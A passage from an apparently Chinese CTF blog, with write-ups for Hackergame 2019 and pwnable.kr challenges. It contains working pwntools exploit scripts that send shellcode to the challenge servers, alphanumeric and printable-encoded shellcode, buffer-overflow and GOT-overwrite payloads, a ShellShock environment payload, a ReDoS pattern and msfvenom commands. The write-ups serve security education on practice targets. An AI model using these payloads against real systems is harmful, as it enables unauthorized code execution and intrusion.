代码：\n这里直接将 option 的 value 填进去了，并没有检验其合法性，因此我们可以修改这个 value 使得其变成一个很大的数，但是这会导致我们钱不够买不了。\n将一个数变得很大，除了增加它的值，还可以将它减少成一个非常小的负数，最终导致溢出，这里就是用的第二种方法。\n8 字节能构成的最小的整数是 -9223372036854775808。那么我们先买 -9223372036854775808 只鸡，再买 -1 只鸡，我们的攻击力就会变成一个非常大的数 9223372036854776000。\nHappy LUG # 查一下资料可以发现这是 PunyCode，题目中的 emoji 表情会被编码为 xn--g28h，因此真实域名是 xn--g28h.hack.ustclug.org。这个域名无法通过浏览器访问，但是却存在，说明一定存在一条对应的 DNS 记录，我们用 nslookup 查一下：\n$ nslookup -qt=ANY xn--g28h.hack.ustclug.org 8.8.8.8 就可以得到 flag。注意到返回的是 “非权威记录”，这是由于 ANY 类型记录 已经被废弃了。\n正则验证器 # 这些题目真的 太新了。\n题目限制了正则长度不超过 6，字符串长度不超过 24，要求构造一个运行时间大于 1 秒的正则。实际上就是 ReDos 攻击。我们可以直接借用 wiki 上的例子：\n(a+)+$ aaaaaaaaaaaaaaaaaaaaaaab 小巧玲珑的 ELF # IDA 打开发现有一堆字符，然后对输入进行运算后与这 45 个字符进行比对，一致则输出 correct，那么我们直接逆运算即可：\nv = [0x66,0x6E,0x65,0x6B,0x83,0x4E,0x6D,0x74,0x85,0x7A,0x6F,0x57,0x91,0x73,0x90,0x4F,0x8D,0x7F,0x63,0x36,0x6C,0x6E,0x87,0x69,0xA3,0x6F,0x58,0x73,0x66,0x56,0x93,0x9F,0x69,0x70,0x38,0x76,0x71,0x78,0x6F,0x63,0xC4,0x82,0x84,0xBE,0xBB,0xCD] for i in range(46): v[i] += i v[i] ^= i v[i] -= 2*i print(bytes(v)) Shell 骇客 # 1 # 应该说是入门 pwn 题：\n// gcc -z execstack -fPIE -pie -z now chall1.c -o chall1 int main() { char buf[0x200]; read(0, buf, 0x200); ((void(*)(void))buf)(); } 这里可以直接执行用户输入，因此只需要写入 shellcode 即可：\nfrom pwn import * context(arch=\u0026#39;amd64\u0026#39;, os=\u0026#39;linux\u0026#39;, log_level=\u0026#39;DEBUG\u0026#39;) # p = process(\u0026#39;./chall1\u0026#39;) p = remote(\u0026#39;202.38.93.241\u0026#39;, 10000) p.recvuntil(\u0026#39;:\u0026#39;) p.sendline(\u0026#39;token\u0026#39;) # token p.send(asm(shellcraft.sh())) p.interactive() 2 # // gcc -m32 -z execstack -fPIE -pie -z now chall2.c -o chall2 int main() { char buf[0x200]; int n, i; n = read(0, buf, 0x200); if (n \u0026lt;= 0) return 0; for (i = 0; i \u0026lt; n; i++) { if(!((buf[i] \u0026gt;= 65 \u0026amp;\u0026amp; buf[i] \u0026lt;= 90) || (buf[i] \u0026gt;= 48 \u0026amp;\u0026amp; buf[i] \u0026lt;= 57))) return 0; } ((void(*)(void))buf)(); } 这题在上一题的基础上限制了输入字符必须是大写字母或数字，并且是基于 x86 的。可以用类似 ALPHA3 的工具对 shellcode 进行转换。先将 shellcode 写入文件：\nfrom pwn import * with open(\u0026#39;shellcode.bin\u0026#39;, \u0026#39;w\u0026#39;) as f: f.write(asm(shellcraft.sh())) 随后使用 ALPHA3 进行转化：\n$ py -2 ALPHA3.py x86 ascii uppercase eax --input=\u0026#34;shellcode.bin\u0026#34; 得到的结果就是新的 payload。\nfrom pwn import * context.log_level = \u0026#39;DEBUG\u0026#39; #p=process(\u0026#39;./chall2\u0026#39;) p = remote(\u0026#39;202.38.93.241\u0026#39;, 10002) p.recvuntil(\u0026#39;:\u0026#39;) p.sendline(\u0026#39;token\u0026#39;) # token p.send(\u0026#39;PYVTX10X41PZ41H4A4I1TA71TADVTZ32PZNBFZDQC02DQD0D13DJE2O0Z2G7O1E7M04KO1P0S2L0Y3T3CKL0J0N000Q5A1W66MN0Y0X021U9J622A0H1Y0K3A7O5I3A114CKO0J1Y4Z5F06\u0026#39;) p.interactive() 看到 flag 后发现，预期解是利用 msfvenom 生成 shellcode：\n$ msfvenom -a x86 --platform linux -p linux/x86/exec CMD=\u0026#34;/bin/sh\u0026#34; -e x86/alpha_upper BufferRegister=eax 3 # // gcc -m64 -z execstack -fPIE -pie -z now chall3.c -o chall3 int main() { char buf[0x400]; int n, i; n = read(0, buf, 0x400); if (n \u0026lt;= 0) return 0; for (i = 0; i \u0026lt; n; i++) { if(buf[i] \u0026lt;32 || buf[i] \u0026gt; 126) return 0; } ((void(*)(void))buf)(); } 本题的限制是 shellcode 由可打印字符构成，且基于 x64 平台。这个似乎靠 msfvenom 就不行了，但是可以换个工具，用 shellcode_encoder：\n$ python2 main.py shellcode.bin rax+29 即可生成 payload，替换第二题的 payload 即可。注意 rax+29 指 shellcode 开始执行的位置。\nfrom pwn import * context(log_level=\u0026#39;DEBUG\u0026#39;) p = remote(\u0026#39;202.38.93.241\u0026#39;, 10004) #p=process(\u0026#39;./chall3\u0026#39;) p.recvuntil(\u0026#39;:\u0026#39;) p.sendline(\u0026#39;token\u0026#39;) # token p.send(\u0026#39;\u0026#39;\u0026#39;PPTAYAXVI31VXXXf-c?f-@`f-@`PZTAYAXVI31VXPP[_Hc4:14:SX-b+e2-( _`5\u0026gt;??_P^14:WX-????-}`aC-@`_}P_Hc4:14:SX-IOF`-A`! 5\u0026gt;_7;P^14:WX-????-}`aC-@`_}P_Hc4:14:SX-\u0026lt;hh)-h` 5n???P^14:WX-????-}`aC-@`_}P_Hc4:14:SX-@{#\u0026#39;-ux @5O6?_P^14:WX-????-}`aC-@`_}P_Hc4:14:SX-@#6p-B 0`5v?_?P^14:WX-????-}`aC-@`_}P_Hc4:14:SX-2 u@-\u0026amp;@@ 5-_?wP^14:WX-????-}`aC-@`_}P_SX- ut*- ,Lv5X_?_P_Hc4:14:SX-Q !0-#@ 5s}.?P^14:WX-????-}`aC-@`_}P_SX-8 `$-%`\u0026#34;|5?~}_P^SX-Ma`R-~c`p5-;?=P_AAAA!bt#MvAr*o$$\u0026gt;I`_UXyyi;||s}_r=60d|jcEH(u\u0026#39;\u0026amp;w6~7AM;wy4II+f\u0026#39;Gw+X#e0T|t30Q.$A\u0026gt;6p?\u0026#39;B[A\u0026lt;zDBH)6f0Rj#XO$\u0026#39;\u0026#39;\u0026#39;) p.interactive() ","date":"2019-10-15","permalink":"/posts/hackergame2019/","section":"Posts","summary":"\u003cp\u003e开拓眼界了。\u003c/p\u003e","title":"Hackergame2019 比赛记录"},{"content":"","date":"2019-10-15","permalink":"/tags/%E6%95%B0%E5%AD%A6/","section":"Tags","summary":"","title":"数学"},{"content":"","date":"2019-10-15","permalink":"/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/","section":"Tags","summary":"","title":"正则表达式"},{"content":"画风很可爱的 Pwn 题练习网站。\nfd # #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; char buf[32]; int main(int argc, char* argv[], char* envp[]){ if(argc\u0026lt;2){ printf(\u0026#34;pass argv[1] a number\\n\u0026#34;); return 0; } int fd = atoi(argv[1] ) - 0x1234; int len = 0; len = read(fd, buf, 32); if(!strcmp(\u0026#34;LETMEWIN\\n\u0026#34;, buf)){ printf(\u0026#34;good job :)\\n\u0026#34;); system(\u0026#34;/bin/cat flag\u0026#34;); exit(0); } printf(\u0026#34;learn about Linux file IO\\n\u0026#34;); return 0; } 这里需要传入一个命令行参数，用它减去 0x1234 后得到 fd 也就是 Linux 下的文件描述符，并读取对应的文件到 buf 中。我们当然可以创建一个文件，但是控制其 fd 比较麻烦；但我们知道，Linux 下标准输入流也有自己的 fd，即 0。因此我们只需要传入 0x1234 的十进制形式 4660，并在标准输入中输入 LETMEWIN\\n 即可：\n$ ./fd 4660 LETMEWIN collision # #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; unsigned long hashcode = 0x21DD09EC; unsigned long check_password(const char* p){ int* ip = (int*)p; int i; int res=0; for(i=0; i\u0026lt;5; i++){ res += ip[i]; } return res; } int main(int argc, char* argv[]){ if(argc\u0026lt;2){ printf(\u0026#34;usage : %s [passcode]\\n\u0026#34;, argv[0]); return 0; } if(strlen(argv[1]) != 20){ printf(\u0026#34;passcode length should be 20 bytes\\n\u0026#34;); return 0; } if(hashcode == check_password( argv[1] )){ system(\u0026#34;/bin/cat flag\u0026#34;); return 0; } else printf(\u0026#34;wrong passcode.\\n\u0026#34;); return 0; } 首先要求输入 20 字节的密码（显然是个 char *），然后将它强制转换为 int * 类型。我们知道，一个 char 是 1 字节，而一个 int 是 4 字节，因此 20 字节的 char 数组会变成 5 个 int 组成的 int 数组。\n这 5 个 int 会被累加，然后要求其和等于 hashcode。换而言之随便找 5 个加起来等于 hashcode 的十六进制数就行了：\n$ python -c \u0026#39;print hex(0x21dd09ec-0x01010101*4)\u0026#39; 0x1dd905e8 $ ./col $(python -c\u0026#39;print \u0026#34;\\xe8\\x05\\xd9\\x1d\u0026#34;+\u0026#34;\\x01\u0026#34;*16\u0026#39;) 注意默认小端法表示。\nbof # #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; void func(int key){ char overflowme[32]; printf(\u0026#34;overflow me :\u0026#34;); gets(overflowme); // smash me! if(key == 0xcafebabe){ system(\u0026#34;/bin/sh\u0026#34;); } else{ printf(\u0026#34;Nah..\\n\u0026#34;); } } int main(int argc, char* argv[]){ func(0xdeadbeef); return 0; } 从 IDA 中观察到 overflowme 在 ebp-2c，而 key 在 ebp+8，相差 0x34。栈上大概是这样的：\nHIGH ADDRESS ---------------------- | the states of main() | // caller ---------------------- | args of func() | // including key. Also in caller\u0026#39;s state ---------------------- | retaddr of func() | ---------------------- | saved ebp | \u0026lt;- ebp ---------------------- | local vars of func() | // including overflowme[] ---------------------- \u0026lt;- esp LOW ADDRESS 了解这些后，我们用 0x34 字节数据作填充，然后用 0xcafebabe 覆盖掉 key 即可。\nfrom pwn import * context.log_level = \u0026#39;DEBUG\u0026#39; # p = process(\u0026#39;./bof\u0026#39;) p = remote(\u0026#39;pwnable.kr\u0026#39;, 9000) payload = \u0026#39;a\u0026#39;*0x34 + p32(0xcafebabe) p.sendline(payload) p.interactive() flag # 在 Hex-View 中发现是 UPX 加壳的，upx -d 脱壳。\n脱壳后的程序提示会 malloc 然后 strcpy 本题的 flag，查看汇编代码，发现这里 flag 的变量名是 cs:flag，跟踪变量得到 flag。\npasscode # #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; void login(){ int passcode1; int passcode2; printf(\u0026#34;enter passcode1 :\u0026#34;); scanf(\u0026#34;%d\u0026#34;, passcode1); fflush(stdin); // ha! mommy told me that 32bit is vulnerable to bruteforcing :) printf(\u0026#34;enter passcode2 :\u0026#34;); scanf(\u0026#34;%d\u0026#34;, passcode2); printf(\u0026#34;checking...\\n\u0026#34;); if(passcode1==338150 \u0026amp;\u0026amp; passcode2==13371337){ printf(\u0026#34;Login OK!\\n\u0026#34;); system(\u0026#34;/bin/cat flag\u0026#34;); } else{ printf(\u0026#34;Login Failed!\\n\u0026#34;); exit(0); } } void welcome(){ char name[100]; printf(\u0026#34;enter you name :\u0026#34;); scanf(\u0026#34;%100s\u0026#34;, name); printf(\u0026#34;Welcome %s!\\n\u0026#34;, name); } int main(){ printf(\u0026#34;Toddler\u0026#39;s Secure Login System 1.0 beta.\\n\u0026#34;); welcome(); login(); // something after login... printf(\u0026#34;Now I can safely trust you that you have credential :)\\n\u0026#34;); return 0; } 直接输入 passcode 的话会显示段错误，显然是因为两个 scanf 都没有在变量前加 \u0026amp;，直接往变量值所代表的地址上写了。\n换句话说，我们可以输入适当的 passcode 来控制两个局部变量的地址，使得他们等于那两个数值。而存储那两个数值的地址，只能来自于我们输入的 name。\n然而这两个数值代表的地址未必可写，name 和两个 passcode 也位于不同栈帧，无法缓冲区溢出来覆盖。到这一步似乎卡住了。但经过反汇编发现 name 在 ebp-0x70，passcode1 在 ebp-0x10，两者相差 96 字节且位于同一栈帧，换句话说 name 是可以覆盖 passcode1 的，这样看似乎又有希望。\n注意到 login 中，scanf 第一次后调用了 fflush。因此我们可以考虑利用 scanf 的写特性写 GOT 表，因为 GOT 表肯定是可写的。那么我们可以先用 fflush 的 GOT 地址（不止 fflush，程序中包含的 GLIBC 函数都行）覆盖 passcode1 的值，然后通过 scanf 对 passcode1 的值所代表的地址（也就是 fflush 的 GOT）写入 system(\u0026quot;/bin/cat flag\u0026quot;) 的地址。这样相当于将 fflush 函数劫持到了 system(\u0026quot;/bin/cat flag\u0026quot;) 上。\nobjdump -R passcode 导出程序动态重定向表，拿到 fflush 的 GOT 地址 0804a004；然后 gdb 里 disas login 拿到 system(\u0026quot;/bin/cat flag\u0026quot;) 的地址 080485e3，注意这个地址实际上是 call system 的前一句：movl $0x80487af,(%esp)，也就是准备 system 函数的参数的语句。最后发 payload：\n$ python \u0026gt;\u0026gt;\u0026gt; from pwn import * \u0026gt;\u0026gt;\u0026gt; context.log_level = \u0026#39;DEBUG\u0026#39; \u0026gt;\u0026gt;\u0026gt; p = process(\u0026#39;./passcode\u0026#39;) \u0026gt;\u0026gt;\u0026gt; p.sendline(\u0026#39;a\u0026#39;*96+p32(0x0804a004)) \u0026gt;\u0026gt;\u0026gt; p.sendline(str(0x080485e3)) \u0026gt;\u0026gt;\u0026gt; p.interactive() 需要注意的是，scanf 的时候接收 %d，因此需要 str 一下转成十进制字符串。\n注：\nGLIBC 函数的 GOT 地址，在 pwntools 中可以用类似 elf.got['fflush'] 的方法获得，更加方便 如果开启了 PIE 则需要 leak 出 GOT 地址。 random # #include \u0026lt;stdio.h\u0026gt; int main(){ unsigned int random; random = rand(); // random value! unsigned int key=0; scanf(\u0026#34;%d\u0026#34;, \u0026amp;key); if((key ^ random) == 0xdeadbeef ){ printf(\u0026#34;Good!\\n\u0026#34;); system(\u0026#34;/bin/cat flag\u0026#34;); return 0; } printf(\u0026#34;Wrong, maybe you should try 2^32 cases.\\n\u0026#34;); return 0; } 我们都知道 C 的 rand 函数是伪随机，随机性取决于 srand 函数设定的种子，这个种子默认为 1。因此 random 变量实际上是固定的，只要在栈上把他读出来即可。\nrandom 是函数的局部变量，并且是 unsigned int，因此应该在 ebp-4 的位置 。我们在有 deadbeef 的那行下断点，随便输入后，在 gdb 中输入 x/8x $rbp-4，即可读取到：\n0x7ffefe6d5d0c: 0x6b8b4567 0x00400670 0x00000000 0x4439d830 0x7ffefe6d5d1c: 0x00007f68 0x00000001 0x00000000 0xfe6d5df8 也就是说，0x6b8b4567 就是这个 random，我们由此可以算出 key 为 3039230856。\ninput # 非常好玩的一题，涵盖了 Linux 下各种基本的通信方式。\n先说一下这题的坑点：/home/input 下我们没有写权限，而 /tmp 目录下有写权限没有读权限，所以比较好的方法是在 /tmp 下新建个目录，把 flag 软链接（ln -s /home/input2/flag ./flag）到这个目录里，脚本放在同一目录下运行。\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;sys/socket.h\u0026gt; #include \u0026lt;arpa/inet.h\u0026gt; int main(int argc, char* argv[], char* envp[]){ printf(\u0026#34;Welcome to pwnable.kr\\n\u0026#34;); printf(\u0026#34;Let\u0026#39;s see if you know how to give input to program\\n\u0026#34;); printf(\u0026#34;Just give me correct inputs then you will get the flag :)\\n\u0026#34;); // argv if(argc != 100) return 0; if(strcmp(argv[\u0026#39;A\u0026#39;],\u0026#34;\\x00\u0026#34;)) return 0; if(strcmp(argv[\u0026#39;B\u0026#39;],\u0026#34;\\x20\\x0a\\x0d\u0026#34;)) return 0; printf(\u0026#34;Stage 1 clear!\\n\u0026#34;); // stdio char buf[4]; read(0, buf, 4); if(memcmp(buf,\u0026#34;\\x00\\x0a\\x00\\xff\u0026#34;, 4)) return 0; read(2, buf, 4); if(memcmp(buf,\u0026#34;\\x00\\x0a\\x02\\xff\u0026#34;, 4)) return 0; printf(\u0026#34;Stage 2 clear!\\n\u0026#34;); // env if(strcmp(\u0026#34;\\xca\\xfe\\xba\\xbe\u0026#34;, getenv(\u0026#34;\\xde\\xad\\xbe\\xef\u0026#34;))) return 0; printf(\u0026#34;Stage 3 clear!\\n\u0026#34;); // file FILE* fp = fopen(\u0026#34;\\x0a\u0026#34;, \u0026#34;r\u0026#34;); if(!fp) return 0; if(fread(buf, 4, 1, fp)!=1 ) return 0; if(memcmp(buf,\u0026#34;\\x00\\x00\\x00\\x00\u0026#34;, 4) ) return 0; fclose(fp); printf(\u0026#34;Stage 4 clear!\\n\u0026#34;); // network int sd, cd; struct sockaddr_in saddr, caddr; sd = socket(AF_INET, SOCK_STREAM, 0); if(sd == -1){ printf(\u0026#34;socket error, tell admin\\n\u0026#34;); return 0; } saddr.sin_family = AF_INET; saddr.sin_addr.s_addr = INADDR_ANY; saddr.sin_port = htons(atoi(argv[\u0026#39;C\u0026#39;]) ); if(bind(sd, (struct sockaddr*)\u0026amp;saddr, sizeof(saddr)) \u0026lt;0){ printf(\u0026#34;bind error, use another port\\n\u0026#34;); return 1; } listen(sd, 1); int c = sizeof(struct sockaddr_in); cd = accept(sd, (struct sockaddr *)\u0026amp;caddr, (socklen_t*)\u0026amp;c); if(cd \u0026lt; 0){ printf(\u0026#34;accept error, tell admin\\n\u0026#34;); return 0; } if(recv(cd, buf, 4, 0) != 4 ) return 0; if(memcmp(buf,\u0026#34;\\xde\\xad\\xbe\\xef\u0026#34;, 4)) return 0; printf(\u0026#34;Stage 5 clear!\\n\u0026#34;); // here\u0026#39;s your flag system(\u0026#34;/bin/cat flag\u0026#34;); return 0; } 可以看到一共有 5 关：\n第一关要求有 100 个命令行参数，其中第 64 个是 \\x00，第 65 个是 \\x20\\x0a\\x0d； 第二关分别从标准输入和标准错误流中读取，要求读到的信息分别是 \\x00\\x0a\\x00\\xff 和 \\x00\\x0a\\x00\\xff，由于我们无法控制标准错误流，可以采用管道重定向的方式； 第三关需要我们设置环境变量 \\xde\\xad\\xbe\\xef=\\xca\\xfe\\xba\\xbe； 第四关读取一个文件，要求前四个字节是 \\x00\\x00\\x00\\x00； 第五关建立了一个 socket，监听的端口来自第 66 个命令行参数，且期望收到的消息是 \\xde\\xad\\xbe\\xef。 编写 python 脚本：\nimport os import subprocess import socket import time # stage 1 args = list(\u0026#34;A\u0026#34;*100) args[0] = \u0026#34;/home/input2/input\u0026#34; args[ord(\u0026#39;A\u0026#39;)] = \u0026#34;\u0026#34; args[ord(\u0026#39;B\u0026#39;)] = \u0026#34;\\x20\\x0a\\x0d\u0026#34; args[ord(\u0026#34;C\u0026#34;)] = \u0026#34;8080\u0026#34; # stage 2 stdin_r, stdin_w = os.pipe() stderr_r, stderr_w = os.pipe() os.write(stdin_w,\u0026#34;\\x00\\x0a\\x00\\xff\u0026#34;) os.write(stderr_w,\u0026#34;\\x00\\x0a\\x02\\xff\u0026#34;) # stage 3 env = {\u0026#34;\\xde\\xad\\xbe\\xef\u0026#34;: \u0026#34;\\xca\\xfe\\xba\\xbe\u0026#34;} # stage 4 with open(\u0026#34;\\x0a\u0026#34;, \u0026#34;wb\u0026#34;) as f: f.write(\u0026#34;\\x00\u0026#34;*4) # open a subprocess here because we need a server p = subprocess.Popen(args, stdin=stdin_r,stderr=stderr_r,env=env) # stage 5 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) time.sleep(1) # wait 4 server s.connect((\u0026#34;127.0.0.1\u0026#34;, 8080)) s.send(\u0026#34;\\xde\\xad\\xbe\\xef\u0026#34;) s.close() leg # #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; int key1(){ asm(\u0026#34;mov r3, pc\\n\u0026#34;); } int key2(){ asm( \u0026#34;push {r6}\\n\u0026#34; \u0026#34;add r6, pc, $1\\n\u0026#34; \u0026#34;bx r6\\n\u0026#34; \u0026#34;.code 16\\n\u0026#34; \u0026#34;mov r3, pc\\n\u0026#34; \u0026#34;add r3, $0x4\\n\u0026#34; \u0026#34;push {r3}\\n\u0026#34; \u0026#34;pop {pc}\\n\u0026#34; \u0026#34;.code 32\\n\u0026#34; \u0026#34;pop {r6}\\n\u0026#34; ); } int key3(){ asm(\u0026#34;mov r3, lr\\n\u0026#34;); } int main(){ int key=0; printf(\u0026#34;Daddy has very strong arm! :\u0026#34;); scanf(\u0026#34;%d\u0026#34;, \u0026amp;key); if((key1()+key2()+key3()) == key ){ printf(\u0026#34;Congratz!\\n\u0026#34;); int fd = open(\u0026#34;flag\u0026#34;, O_RDONLY); char buf[100]; int r = read(fd, buf, 100); write(0, buf, r); } else{ printf(\u0026#34;I have strong leg :P\\n\u0026#34;); } return 0; } 同时，本题也给出了对应的 gdb 反汇编结果，显然是 arm 汇编指令。参考\narm 架构下：\n采用 RISC 指令集 pc 指向当前执行指令地址 + 8 处 r0 保存返回值 r11 对应 ebp，r13 对应 esp r15 即 pc，存储当前指令 + 8（thumb 模式下 + 4）的位置（即后两条指令） arm 模式下指令长度 4 字节，thumb 模式下 2 字节 bx：带状态切换的跳转 知道了这些后，逐函数查看，先是 key1：\n(gdb) disass key1 Dump of assembler code for function key1: 0x00008cd4 \u0026lt;+0\u0026gt;: push {r11} ; (str r11, [sp, #-4]!) 0x00008cd8 \u0026lt;+4\u0026gt;: add r11, sp, #0 0x00008cdc \u0026lt;+8\u0026gt;: mov r3, pc 0x00008ce0 \u0026lt;+12\u0026gt;: mov r0, r3 0x00008ce4 \u0026lt;+16\u0026gt;: sub sp, r11, #0 0x00008ce8 \u0026lt;+20\u0026gt;: pop {r11} ; (ldr r11, [sp], #4) 0x00008cec \u0026lt;+24\u0026gt;: bx lr End of assembler dump. 前两句和后三句是 arm 的函数入栈出栈返回操作，中间给 r3 赋值 0x00008ce4 并返回。\nkey2：\n(gdb) disass key2 Dump of assembler code for function key2: 0x00008cf0 \u0026lt;+0\u0026gt;: push {r11} ; (str r11, [sp, #-4]!) 0x00008cf4 \u0026lt;+4\u0026gt;: add r11, sp, #0 0x00008cf8 \u0026lt;+8\u0026gt;: push {r6} ; (str r6, [sp, #-4]!) 0x00008cfc \u0026lt;+12\u0026gt;: add r6, pc, #1 0x00008d00 \u0026lt;+16\u0026gt;: bx r6 0x00008d04 \u0026lt;+20\u0026gt;: mov r3, pc 0x00008d06 \u0026lt;+22\u0026gt;: adds r3, #4 0x00008d08 \u0026lt;+24\u0026gt;: push {r3} 0x00008d0a \u0026lt;+26\u0026gt;: pop {pc} 0x00008d0c \u0026lt;+28\u0026gt;: pop {r6} ; (ldr r6, [sp], #4) 0x00008d10 \u0026lt;+32\u0026gt;: mov r0, r3 0x00008d14 \u0026lt;+36\u0026gt;: sub sp, r11, #0 0x00008d18 \u0026lt;+40\u0026gt;: pop {r11} ; (ldr r11, [sp], #4) 0x00008d1c \u0026lt;+44\u0026gt;: bx lr End of assembler dump. 第三行保存 r6，第四行 r6 变成 0x00008d05，第五行进行带状态切换的跳转，由于 r6 最低位为 1，切换为 thumb 模式并跳转到 0x00008d04，也就是第六行。\n第六行，由于处于 thumb 模式，pc 指向当前指令 + 4 的位置，r3 变成 0x00008d08。第七行 r3+4 变成 0x0008d0c，这就是最终的返回值。\nkey3：\n(gdb) disass key3 Dump of assembler code for function key3: 0x00008d20 \u0026lt;+0\u0026gt;: push {r11} ; (str r11, [sp, #-4]!) 0x00008d24 \u0026lt;+4\u0026gt;: add r11, sp, #0 0x00008d28 \u0026lt;+8\u0026gt;: mov r3, lr 0x00008d2c \u0026lt;+12\u0026gt;: mov r0, r3 0x00008d30 \u0026lt;+16\u0026gt;: sub sp, r11, #0 0x00008d34 \u0026lt;+20\u0026gt;: pop {r11} ; (ldr r11, [sp], #4) 0x00008d38 \u0026lt;+24\u0026gt;: bx lr End of assembler dump. (gdb) 这里将 lr 赋值给 r3，然后 r3 作为返回值。而 lr 相当于 return address，需要我们回到 main 里去看相关调用：\n... 0x00008d64 \u0026lt;+40\u0026gt;: bl 0xfbd8 \u0026lt;__isoc99_scanf\u0026gt; 0x00008d68 \u0026lt;+44\u0026gt;: bl 0x8cd4 \u0026lt;key1\u0026gt; 0x00008d6c \u0026lt;+48\u0026gt;: mov r4, r0 0x00008d70 \u0026lt;+52\u0026gt;: bl 0x8cf0 \u0026lt;key2\u0026gt; 0x00008d74 \u0026lt;+56\u0026gt;: mov r3, r0 0x00008d78 \u0026lt;+60\u0026gt;: add r4, r4, r3 0x00008d7c \u0026lt;+64\u0026gt;: bl 0x8d20 \u0026lt;key3\u0026gt; 0x00008d80 \u0026lt;+68\u0026gt;: mov r3, r0 0x00008d84 \u0026lt;+72\u0026gt;: add r2, r4, r3 ... 可以看到这里进行了 bl 0x8d20 来调用 key3 函数，指令位于 0x00008d7c，那么此时返回地址应该是它的下一条指令所在地址，也就是 0x00008d80。\n至此我们已经拿到了 3 个 key，相加得到 108400，输入即可。\n精简指令集的确精简。\nmistake # #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #define PW_LEN 10 #define XORKEY 1 void xor(char* s, int len){ int i; for(i=0; i\u0026lt;len; i++){ s[i] ^= XORKEY; } } int main(int argc, char* argv[]){ int fd; if(fd=open(\u0026#34;/home/mistake/password\u0026#34;,O_RDONLY,0400) \u0026lt;0){ printf(\u0026#34;can\u0026#39;t open password %d\\n\u0026#34;, fd); return 0; } printf(\u0026#34;do not bruteforce...\\n\u0026#34;); sleep(time(0)%20); char pw_buf[PW_LEN+1]; int len; if(!(len=read(fd,pw_buf,PW_LEN) \u0026gt; 0)){ printf(\u0026#34;read error\\n\u0026#34;); close(fd); return 0; } char pw_buf2[PW_LEN+1]; printf(\u0026#34;input password :\u0026#34;); scanf(\u0026#34;%10s\u0026#34;, pw_buf2); // xor your input xor(pw_buf2, 10); if(!strncmp(pw_buf, pw_buf2, PW_LEN)){ printf(\u0026#34;Password OK\\n\u0026#34;); system(\u0026#34;/bin/cat flag\\n\u0026#34;); } else{ printf(\u0026#34;Wrong Password\\n\u0026#34;); } close(fd); return 0; } 注意到 XORKEY 为 1，也就是说 xor 函数只是把字符串的每个字符最低位翻转了一下。此外我们还知道输入的密码和文件中密码都是 10 字节，但我们读取不了后者。\n回到题目提示，说和运算符优先级有关，回代码里看看也只有 fd=open(\u0026quot;/home/mistake/password\u0026quot;,O_RDONLY,0400) \u0026lt; 0 可能出问题了，这里会先进行小于号比较，再将结果，一个布尔值，赋值给 fd。如果文件正常打开，那么 fd 应该为 false 也就是 0，这就是标准输入流的 fd，换句话说这个 pw_buf 的内容也是我们可以控制的。\n之后就容易了，标准输入里输入十个 b，然后提示 input password: 时输入十个 c 使得异或结果正确即可。\nshellshock # #include \u0026lt;stdio.h\u0026gt; int main(){ setresuid(getegid(), getegid(), getegid()); setresgid(getegid(), getegid(), getegid()); system(\u0026#34;/home/shellshock/bash -c\u0026#39;echo shock_me\u0026#39;\u0026#34;); return 0; } 我们需要结合 ls -al 的结果来分析代码：\ndrwxr-x--- 5 root shellshock 4096 Oct 23 2016 . drwxr-xr-x 114 root root 4096 May 19 15:59 .. -r-xr-xr-x 1 root shellshock 959120 Oct 12 2014 bash d--------- 2 root root 4096 Oct 12 2014 .bash_history -r--r----- 1 root shellshock_pwn 47 Oct 12 2014 flag dr-xr-xr-x 2 root root 4096 Oct 12 2014 .irssi drwxr-xr-x 2 root root 4096 Oct 23 2016 .pwntools-cache -r-xr-sr-x 1 root shellshock_pwn 8547 Oct 12 2014 shellshock -r--r--r-- 1 root root 188 Oct 12 2014 shellshock.c 可以看到我们对 flag 文件没有任何权限，但是 shellshock_pwn 组的用户可以读 flag。回到代码中，将 uid 和 gid 设成 egid 后，程序已经拥有了 shellshock_pwn 组的权限，可以读到 flag 了，只是并没有读 flag 的代码。\n联系题目提示，我们可以利用 bash 的 ShellShock 漏洞，具体原理可以参考链接中的文章。输入 payload：\n$ export foo=\u0026#39;() {:;}; /bin/cat flag\u0026#39; $ ./shellshock coin1 # 找假币问题，在 N 个硬币中最多花 C 次来找到唯一的一个较轻的假币，需要在 30 秒内完成 100 次游戏。最经典的解法就是二分，每次称一半，如果重量不是 10 的倍数则其中必定有假币，否则假币在另一半中，这样最多需要 log(2, n) 次就能找出假币。需要注意的是，由于网络延迟的关系，最好是在 pwnable.kr 的机器上运行脚本。\nfrom pwn import * import re p = remote(\u0026#39;localhost\u0026#39;, 9007) ret = p.recv() sleep(3) for i in range(100): ret = p.recv() N = ret[ret.find(\u0026#34;N=\u0026#34;)+2:ret.find(\u0026#34; \u0026#34;)] C = ret[ret.find(\u0026#34;C=\u0026#34;)+2:ret.find(\u0026#34;\\n\u0026#34;)] low = 0 high = int(N) for j in range(int(C)): cnt = (high-low) / 2 mid = low + cnt query = \u0026#39;\u0026#39;.join([str(i) for i in range(low, mid)]) p.sendline(query) ret = p.recv() if int(ret) % 10 == 0: low = mid else: high = mid p.sendline(str(low)) print p.recv() print p.recv() blackjack # 这题要求玩 21 点玩到拥有 $1,000,000，显然不能通过常规方法达成。我们查看题目给的源码，发现下注时使用的变量 bet 是一个 int 类型的数。\n随后，betting 函数是这样的：\nint betting() //Asks user amount to bet { printf(\u0026#34;\\n\\nEnter Bet: $\u0026#34;); scanf(\u0026#34;%d\u0026#34;, \u0026amp;bet); if (bet\u0026gt; cash) //If player tries to bet more money than player has { printf(\u0026#34;\\nYou cannot bet more money than you have.\u0026#34;); printf(\u0026#34;\\nEnter Bet:\u0026#34;); scanf(\u0026#34;%d\u0026#34;, \u0026amp;bet); return bet; } else return bet; } // End Function 这里程序检查了下的注是否大于拥有的现金数，但并没有检查是否为负数。而当我们输掉一盘后：\nif(player_total\u0026lt;dealer_total) //If player\u0026#39;s 